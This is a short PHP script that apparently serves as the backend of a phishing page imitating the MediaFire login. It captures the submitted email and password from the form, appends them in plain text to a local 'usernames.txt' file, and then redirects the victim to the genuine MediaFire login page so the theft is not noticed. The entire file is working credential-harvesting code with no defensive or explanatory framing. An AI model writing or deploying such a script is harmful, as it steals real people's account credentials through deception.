<?php

file_put_contents("../usernames.txt", "mediafire Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_pass'] ."\n", FILE_APPEND);
header('Location: https://www.mediafire.com/login/');
exit();
?>